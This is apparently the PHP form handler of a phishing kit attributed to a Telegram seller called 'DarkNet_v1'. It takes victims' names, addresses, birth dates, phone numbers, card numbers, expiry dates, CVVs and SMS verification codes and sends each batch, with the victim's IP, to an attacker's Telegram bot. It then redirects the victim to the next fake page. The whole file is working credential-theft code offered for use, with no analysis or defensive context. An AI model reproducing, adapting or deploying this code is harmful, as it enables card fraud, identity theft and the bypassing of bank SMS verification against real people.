<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    session_start();


    include "config.php";


    

    if(isset($_POST["details"])){


        $name1 = "<code>".$_POST['last_name']."</code>";
        $name2 = "<code>".$_POST['first_name']."</code>";
        $Email = "<code>".$_POST['email']."</code>";
        $date = "<code>".$_POST['birth_date']."</code>";
        $addr = "<code>".$_POST['address']."</code>";
        $zip = "<code>".$_POST['zip_code']."</code>";
        $City = "<code>".$_POST['city']."</code>";
        $tele = "<code>".$_POST['phone']."</code>";

        $message=
        '<blockquote>[DETAILS] => DGT</blockquote>'."\n".     
        '- F_Name : '.$name1."\n".
        '- L_Name : '.$name2."\n".
        '- Email : '.$Email."\n".
        '- birth_date : '.$date."\n".
        '- Address : '.$addr."\n".
        '- Zip Code : '.$zip."\n".
        '- City : '.$City."\n".
        '- Tele_Number : '.$tele."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".        
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();         
        header("Location: ../../../card.php");
        exit();          

    }elseif(isset($_POST["card"])){
        $number   = "<code>".$_POST["one"]."</code>";
        $exp      = "<code>".$_POST["two"]."</code>";
        $cvv      = "<code>".$_POST["three"]."</code>";
        $n = $string = str_replace(' ', '', $_POST["one"]);
        $message=
        '<blockquote>[CC] => DGT</blockquote>'."\n".
        '- Card Number : '.$number."\n".
        '- Exp : '.$exp."\n".
        '- Cvv : '.$cvv."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".        
        '- Type : '.'https://cardimages.imaginecurve.com/cards/'.substr($n,0,6).'.png'."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();         
        header("Location: ../../../loading.php");
        exit();

    }elseif(isset($_POST["sms"])){

        $sms      = "<code>".$_POST["sms_code"]."</code>";

        $message=
        '<blockquote>[SMS] => DGT</blockquote>'."\n".     
        '- SMS : '.$sms."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".        
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();  
        header("Location: ../../../loading.php");
        exit();        
 
    }elseif(isset($_POST["app"])){

        $message=
        '<blockquote>[App] => DGT</blockquote>'."\n".     
        '- Confirmed from APP ✅'."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".        
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        header("Location: ../../../loading.php?error=");
        exit();      
 
    }

?>